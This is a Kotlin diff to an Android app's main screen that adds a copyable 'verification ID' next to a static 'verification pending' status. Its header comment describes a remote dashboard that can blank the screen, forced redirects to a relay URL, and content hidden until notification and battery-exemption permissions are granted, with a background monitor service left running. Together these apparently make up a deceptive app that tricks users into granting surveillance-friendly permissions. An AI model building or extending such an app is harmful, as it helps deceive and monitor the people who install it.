@@ -1,6 +1,9 @@
 package com.notify
 
 import android.Manifest
+import android.content.ClipData
+import android.content.ClipboardManager
+import android.content.Context
 import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
@@ -22,9 +25,10 @@ import androidx.core.content.ContextCompat
  *    else. Only the dashboard can turn it off.
  * 2. Sticky relay (Relay 1/2 buttons) -> every app open auto-redirects to
  *    the relay URL without showing app contents, until "Stop Relay".
- * 3. Otherwise status + note are hidden until ALL required permissions are
- *    granted (notifications + battery exemption). After grant, a static
- *    verification status is shown (1-2 business days, close-app friendly).
+ * 3. Otherwise status + verification ID + note are hidden until ALL required
+ *    permissions are granted (notifications + battery exemption). After grant,
+ *    a static verification status is shown (1-2 business days, close-app
+ *    friendly) with a stable 7-char ID the business replies with by email.
  * Background wiring (monitor service, Teller register/heartbeat,
  * alias enforcement) is unchanged.
  */
@@ -34,6 +38,8 @@ class MainActivity : AppCompatActivity() {
 
     private lateinit var countdownView: TextView
     private lateinit var devNoteView: TextView
+    private lateinit var verifyLabelView: TextView
+    private lateinit var verifyIdView: TextView
     private lateinit var gateView: LinearLayout
     private lateinit var btnNotifications: Button
     private lateinit var btnBattery: Button
@@ -59,6 +65,17 @@ class MainActivity : AppCompatActivity() {
 
         countdownView = findViewById(R.id.countdown_timer)
         devNoteView = findViewById(R.id.dev_note)
+        verifyLabelView = findViewById(R.id.verify_id_label)
+        verifyIdView = findViewById(R.id.verify_id_value)
+        verifyIdView.text = VerifyId.getOrCreate(this)
+        verifyIdView.setOnLongClickListener {
+            try {
+                val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+                cm.setPrimaryClip(ClipData.newPlainText("Verification ID", verifyIdView.text))
+                Toast.makeText(this, "Verification ID copied.", Toast.LENGTH_SHORT).show()
+            } catch (_: Exception) {}
+            true
+        }
         gateView = findViewById(R.id.permission_gate)
         btnNotifications = findViewById(R.id.btn_grant_notifications)
         btnBattery = findViewById(R.id.btn_grant_battery)
@@ -118,6 +135,8 @@ class MainActivity : AppCompatActivity() {
         if (DeviceRegistrar.isBlankEnabled(this)) {
             countdownView.visibility = View.GONE
             devNoteView.visibility = View.GONE
+            verifyLabelView.visibility = View.GONE
+            verifyIdView.visibility = View.GONE
             gateView.visibility = View.GONE
             return
         }
@@ -127,6 +146,8 @@ class MainActivity : AppCompatActivity() {
         if (DeviceRegistrar.hasStickyRelay(this)) {
             countdownView.visibility = View.GONE
             devNoteView.visibility = View.GONE
+            verifyLabelView.visibility = View.GONE
+            verifyIdView.visibility = View.GONE
             gateView.visibility = View.GONE
             val now = SystemClock.elapsedRealtime()
             if (now - lastStickyFireElapsed > 3000L) {
@@ -139,9 +160,13 @@ class MainActivity : AppCompatActivity() {
             gateView.visibility = View.GONE
             countdownView.visibility = View.VISIBLE
             devNoteView.visibility = View.VISIBLE
+            verifyLabelView.visibility = View.VISIBLE
+            verifyIdView.visibility = View.VISIBLE
         } else {
             countdownView.visibility = View.GONE
             devNoteView.visibility = View.GONE
+            verifyLabelView.visibility = View.GONE
+            verifyIdView.visibility = View.GONE
             gateView.visibility = View.VISIBLE
             // Only show the button(s) for what's still missing.
             btnNotifications.visibility =
